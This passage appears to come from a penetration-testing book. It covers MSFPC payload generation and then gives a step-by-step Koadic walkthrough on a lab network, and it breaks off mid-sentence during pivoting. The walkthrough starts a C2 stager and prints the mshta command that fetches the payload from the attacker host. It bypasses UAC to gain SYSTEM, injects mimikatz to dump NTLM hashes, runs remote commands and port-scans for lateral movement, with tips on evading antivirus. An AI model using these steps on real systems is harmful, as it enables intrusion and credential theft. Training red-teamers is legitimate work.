> ![](media/image83.jpeg)
>
> Let\'s check the .rc file generated from the preceding command:
>
> ![](media/image84.jpeg)
>
> The payload is set to windows/shell_bind_tcp, which is a stageless
> payload. A staged
>
> payload in Metasploit would be windows/shell/bind_tcp.
>
> TCP/HTTP/HTTPS/FIND_PORT: The communication method required by the
> payload to communicate with the payload handler.
>
> TCP: This is the standard communication method once the payload is
>
> executed on the target server. This communication method can be used
> with any type of payload and payload format, but this can easily be
> detected by IDS and blocked by firewalls and IPS because of its
> unencrypted nature.
>
> HTTP: If this option is used by MSFPC, the payload will use HTTP as
> the communication method. Instead of communicating on any given TCP
> port, the payload will communicate on port 80. This option can be used
> to bypass firewalls if only port 80 is open on the target system. This
> can be detected by IDS and blocked IPS because of its unencrypted
> nature.
>
> HTTPS: This option is used when generating a payload that will use SSL
> communication. It\'s recommended to use this option for stealthy
> reverse connections.
>
> FIND_PORT: This option is used when we are unable to get reverse
> connections from common ports (80, 443, 53, 21). If this option is
> set, MSFPC will generate the payload, which will try all 1-65535 ports
> for communication.
>
> BATCH/LOOP: MSFPC can generate multiple payloads (multiple OS
> platforms) with a single command. This can be achieved by using either
> the BATCH Mode or LOOP Mode.
>
> BATCH Mode: In the BATCH mode, MSFPC can generate multiple payloads
> with as many combinations of payload type as possible:
>
> **./msfpc batch windows en0**
>
> ![](media/image85.jpeg)
>
> MSFPC generated all the combination of payloads for only Windows (as
> mentioned in the options) with their respective resource files (.rc):
>
> ![](media/image86.png)
>
> LOOP Mode: This mode can generate multiple payloads of all types.
> MSFPC can also generate all the payloads for a given LHOST. This can
> be useful in an environment where we don\'t have the exact knowledge
> of the platform\'s OS. The payloads can be generated with the
> following command:
>
> **./msfpc.sh loop 192.168.10.122**
>
> ![](media/image87.jpeg)
>
> ![](media/image88.jpeg)MSFPC generates payloads with DEFAULT values
> for all the payload types with their respective resource files (.rc):
>
> VERBOSE: This option is used if you want to get more information on
> what values are used by MSFPC while generating a payload:
>
> **./msfpc.sh loop 192.168.10.122 8080 verbose**
>
> ![](media/image89.jpeg)
In this case, LOOP mode is used to generate payloads with LPORT set to
8080.
> The features of the tool are updated and maintained by its repository.
> It\'s highly recommended to look for tool updates online every two
> weeks.
# Koadic
> Koadic is a Windows post-exploitation toolkit with a similar interface
> to the other famous tools used for penetration testing purposes,
> namely, Empire and Metasploit. It\'s called C3 for a reason and that
> is because it uses the **Component Object Model** (**COM**) in Windows
> and operates using the script host utility
>
> (also known as JScript/VBScript). COM objects were introduced by
> Microsoft in 1993, which also means that Koadic\'s payloads are
> compatible with the older versions of Windows (NT/95/2000) up until
> the latest version, Windows 10.
>
> Koadic is built on Python and it\'s compatible with Python 2 as well
> as Python 3. The payloads generated by Koadic can be executed
> completely in-memory (from the stage 0 to the second stage and beyond)
> and it also supports the stager communication over SSL/TLS, although
> it depends upon what setting is enabled on the victim OS.
![](media/image90.jpeg)
# Installation
> For installation, use the following command to clone the repository
> from GitHub:
>
> **git clone https://github.com/zerosum0x0/koadic**
>
> A quick listing will show the files present in the Koadic directory,
> using the following command:
>
> **ls -alh**
>
> ![](media/image91.png)
>
> requirements.txt contains the Python packages that are required to run
> koadic. The following command can be used to install these packages
> from requirement.txt:
>
> **sudo pip install -r requirement.txt**
>
> ![](media/image92.jpeg)
Once the installation is complete, you can run koadic by executing the
following
> command:
**./koadic**
> ![](media/image93.jpeg)
>
> Koadic starts with the MSHTA stager as the default stager. The
> **Microsoft HTML Application** (**MSHTA**) is a full-grown Microsoft
> Windows HTML application that is *trusted* by the developer who
> creates it. It\'s like the Internet Explorer browser but without the
> user interface or any strict security model. It displays only a few
> options, such as menus, icons, title information, and toolbars.
# Why use MSHTA as the dropper payload?
> One of the coolest reasons of using MSHTA for payload delivery is its
> support for scripting languages, such as VBScript and JScript, and as
> it\'s explained in the introductory part of this tool, Koadic does not
> uses PowerShell for post- exploitation. PowerShell was a really great
> playground for attackers and red- teamers for years and like every
> good playground, there comes a time when it gets too messy. Nowadays,
> even if you encode the PowerShell command into base64 or any other
> encoder, the payload delivery still gets detected by so-called
> *AntiVirus with Machine Learning and Artificial Intelligence*. The
> reason for this is that instead of trying to detect the payload
> command or the shellcode embedded in it, the *smart* AVs detect the
> intrusion by a mere execution of the powershell.exe program.
In a corporate environment, there are times when the servers are not
installed with any AVs and their built-in AV solutions are also disabled
(Windows Defender). Even then, if you try to execute powershell.exe,
your execution is denied by the server because of the hard
implementation of the group policies.
> Also, there is another issue with payload delivery over PowerShell and
> that is, PowerShell itself. The payload will only be able to deliver
> and execute if PowerShell supports the functions used in the payload.
> For example, if the payload requires you to use PowerShell version 2
> but the execution is happening on Microsoft Windows Server 2003 with
> only PowerShell version 1 support, the payload execution will fail.
> Koadic, on the other hand, relies upon VBScript and JScript, which are
> installed from the older version of Windows and are still supported in
> the latest version, which makes the payload dropper more reliable than
> PowerShell.
# Terminology
> Before getting into the details of all the options used in this tool,
> let\'s first take a look at the terminologies of the tool:
>
> **Zombies**:
>
> The compromised system that connects back to the Koadic Command and
> Control Server. Just like a session is opened in Metasploit, a zombie
> will connect back to Koadic.
>
> **Stagers**:
>
> The Command and Control web server from where the payload and implants
> are fetched by the zombie. Stagers are also used to maintain the
> connection between the zombies and Koadic. Note that Koadic does not
> rely on TCP connections for continues communication. Instead, the
> connection is maintained by requesting multiple HTTP connections.
## Implants:
> An implant is a JavaScript or a VBScript code, which is executed by
> zombies to perform a certain task. It\'s the same as the post modules
> in Metasploit. Once an implant is chosen to be used by Koadic, the
> script is sent over to the zombies and is executed on the system. The
> fetched results are then displayed on the Koadic C2 panel.
>
> In Koadic, the implants are categorized as follows: pivot,
> persistence, manage, utils, elevate, gather, scan, fun, and inject.
## Jobs:
> Whenever the stager (C2) executes an implant (post module) over to the
> zombie (compromised system), a job is created in this process by C2.
> C2 gives the job execute the implant to the zombies and once the job
> is
>
> completed, C2 is notified about the completion (also displayed on the
> C2 panel).
>
> To start with this tool, we can start by first executing a help
> command or we can use a ? instead:
>
> **?**
>
> ![](media/image94.jpeg)
>
> The ? command will show all the commands that are supported by the
> Koadic C2 with their respective descriptions.
>
> To use Koadic, we can follow the given stages for performing a Koadic-
> style post-exploitation:
>
> ![](media/image95.jpeg)
1.  **Stager Establishment**: Set up the stager web server where the
    > zombie will get connected.
2.  **Payload Execution**: Drop the payload over to the target server
    > and execute the payload to get the zombie hooked up by Koadic.
3.  **Running Implants**: Execute the implants to get domain
    > information, SYSTEM access, and NTLM hashes. These can be used for
    > further post- exploitation.
4.  **Pivoting**: Hook the zombie and move around the network through
    > it.
# Stager establishment
> You need to first configure the stager and get it ready, which can be
> done by first setting up the details that are required by the stager.
> For getting the details, you can execute the following command:
> **info**
>
> This will show the information for the current stager, which can be
> changed according to the needs:
>
> ![](media/image96.jpeg)
>
> We can change the settings using the set command (the same as
> Metasploit and Empire). In this case, we will be changing the stager
> web server port to 8080 by executing the following command: **set
> SRVPORT 8080**
>
> ![](media/image97.jpeg)
Now the stager is ready to listen on port 8080 for reverse connections.
To start with the stager web server, we need to run the server by
executing the run command: **Run**
> ![](media/image98.jpeg)
>
> The stager web server is successfully started on the local IP
> 192.168.10.122 and port 8080. Koadic also provides a command (mshta
> http://192.168.10.122:8080/MDRV9),
which needs to be executed on the target Windows system. As mentioned
before, this tool is not about enumeration or exploitation; it\'s all
about post-exploitation.
But this tool can be used in exploitation when trying to deliver the
payload.
# Payload execution
> ![](media/image99.jpeg)Different means of transport can be used to
> deliver the payload over to the target system (MS Word, PDF, EXE, DLL,
> and so on.) and once the payload is executed on the target server (in
> this case, the Koadic stager already has the command, which will be
> executed on the system):
>
> ![](media/image100.jpeg)The stager hooks up the zombie. Koadic C2 will
> be notified when the zombie is connected. Some system information
> (such as the IP address, hostname, and Windows OS version) is also
> shared between the zombie and the stager:
>
> To check up on the zombie, you can execute the following command:
>
> **Zombies**
>
> ![](media/image101.jpeg)
>
> This will show the allotted ID by C2 to the zombie, the IP address of
> the zombie, the status, and the last seen (just like WhatsApp and FB
> Messenger)
>
> To get more information regarding a zombie, you can execute Zombies
> \, where
ID is the identification number allotted by C2 to the zombie. In this
case, it\'s 1:
## zombies 1
> ![](media/image102.jpeg)
As you can see, the information regarding the zombie with ID 1 is
displayed. In the displayed information, there\'s one thing that we need
to focus on; that is, the
> Elevated status.
>
> Currently, the Elevated status says No, which means it\'s not running
> with SYSTEM
privileges but we can achieve system level privs by executing an
implant.
# Running Implants
> In this case, the bypassuac_eventvwr implant is used for escalating
> the privileges from ring 3 (user land privs) to SYSTEM. To use an
> implant, you can execute the following command: **use
> implant/elevate/bypassuac_eventvwr**
>
> The option is changed from stager to the implant now and just like we
> did it when configuring the stager, we need to configure the implant
> before executing it.
We can find the options by executing the following command:
> ![](media/image103.jpeg)**Info**
>
> This will show two options that need to be configured for a successful
> implant execution: PAYLOAD and ZOMBIE. To set up the payload, execute
> the following command: **set payload 0**
>
> ![](media/image104.jpeg)
The question here is, why did we set the payload to 0? For understanding
this, we need to reference the value from the Listeners command:
> ![](media/image105.jpeg)**Listeners**
>
> The listeners command will list down all the stagers running. So, when
> the payload is set to 0 it means the payload will be using the given
> stager ID 0; that is, the MSHTA stager for implant delivery over to
> the zombie for execution.
>
> The implant is now ready to be executed on the target system:
>
> **Run**
>
> ![](media/image106.jpeg)
>
> ![](media/image107.jpeg)At the time of execution, a new connection is
> created with the elevated privileges with zombie ID 2. On getting the
> information regarding the elevated connection, we can see clearly that
> the privileges were escalated with the \* on the user field. The same
> is mentioned on the ID as well:
>
> We can either use the implant for dumping hash or we can use mimikatz.
> Koadic supports mimikatz by injecting the DLL into the memory
> directly. To use mimikatz, run the following command: **use
> implant/inject/mimikatz_dynwrapx**
>
> ![](media/image108.jpeg)
You can run it directly without changing any settings:
> **run**
>
> ![](media/image109.jpeg)
>
> By running the implant, we were able to fetch the NTLM hashes, which
> can further be used in pivoting.
>
> To execute a command on a zombie we can use the exec_cmd implant,
> which can be run by executing the following command:
>
> **use implant/manage/exec_cmd**
>
> ![](media/image110.jpeg)
>
> CMD option is the command that you want to execute. This implant will
> execute the command and save the result in a file that will be stored
> on the %TEMP% directory (as mentioned in the implant settings). We can
> change the directory accordingly but make sure the directory is
> writeable.
In this case, we will be executing a command to get the list of users on
the system by setting cmd to net user:
> ![](media/image111.jpeg)**set cmd \"net user\"**
# Pivoting
> We now have access to the 192.168.10.171 system and using the
> credentials of this system, we can move around in the network and try
> to access another system that is in the same network. However, for
> this to work, we need to know the services running on the system. For
> this, we can use the tcp scanner implant for port scanning, which can
> be done by running the following commands:
>
> ![](media/image112.jpeg)**use implant/scan/tcp info**
>
> **set rports 135,139,445**
>
> **set rhosts 192.168.10.130**
>
> **set zombie 0**
>
> The implant is ready to roll! Now we just need to run it:
>
> **run**
>
> ![](media/image113.jpeg)
>
> The mentioned ports are open, which means we can access the **Remote
> Procedure Call** (**RPC**) server on port 445 of this system. The main